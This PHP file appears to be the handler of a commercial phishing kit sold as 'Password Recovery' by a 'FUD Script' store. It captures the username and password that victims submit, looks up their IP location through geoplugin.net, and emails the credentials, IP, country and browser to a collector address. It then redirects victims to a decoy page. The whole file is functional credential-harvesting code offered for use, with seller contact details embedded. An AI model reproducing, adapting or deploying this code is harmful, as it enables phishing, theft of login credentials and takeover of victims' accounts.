<?php
$country = visitor_country();
$countryCode = visitor_countryCode();
$continentCode = visitor_continentCode();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$login = $_POST['login'];
$passwd = $_POST['passwd'];
$own = 'no-reply@logbox.com';
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$server = date("D/M/d, Y g:i a"); 
$domain = 'DOMAIN';
$sender = 'Recovery-PRC-EN8.1.3';
$subj = "1 New Login | Country: $country | IP: $ip";
$headers .= "From: Recovery-PRC-EN8.1.3<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'rootloader.php?email=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>*You have received 1 New Login from: $login</td></tr>
 <tr><td>=====================================================================================================================</td></tr>
  <tr><td></td></tr>
 <tr><td>*Here's Your Login Credentials:<td/></tr>
 <tr><td>Username: <b>$login</b> <td/></tr>
 <tr><td>Password: <b>$passwd</b> </td></tr>
 <tr><td>=====================================================================================================================</td></tr>
 <tr><td></td></tr>
 <tr><td>Country: $country</td></tr>
 <tr><td>Login IP: <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a></td></tr>
 <tr><td>User Browser: $browser <td/></tr>
 <tr><td>=====================================================================================================================</td></tr>
 <tr><td></td></tr>
 <tr><td>
 *Product (Script) Information: <br>
 This script is a product of <b>FUD Script</b> Online Store.
	<ul>
	<li>Product Code: PRC-EN8.1.3 </li>
	<li>Product Name: Password Recovery </li>
	<li>Product Language: English </li>
	<li>Auto-Email Grabber: Yes </li>
	<li>Auto-Domain: Grabber: Yes </li>
	<li>No. of Password Fill: 2 times </li>
	<li>Redirection: Back to Email Provider's Domain.</li>
	</ul>
	
 <b>*</b>Seller's Information 
 <br>
 || Website: http://fudscript.com || Email: fudscript@yandex.com || Skype Name: live:.cid.e9a501b2945d19c5 || Skype ID: FUD Script ||
 </td></tr>
 <tr><td></td></tr>
 <tr><td>=====================================================================================================================</td></tr>
 <tr><td><td/></tr>
 </BODY>
 </HTML>";
if (empty($login) || empty($passwd)) {
header("Location: rootloader.php?email=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}
else {
mail($own,$subj,$msg,$headers);
header("Location: rootloader.php?email=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function visitor_countryCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $result = $ip_data->geoplugin_countryCode;
    }

    return $result;
}
function visitor_regionName()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_regionName != null)
    {
        $result = $ip_data->geoplugin_regionName;
    }

    return $result;
}
function visitor_continentCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_continentCode != null)
    {
        $result = $ip_data->geoplugin_continentCode;
    }

    return $result;
}
?>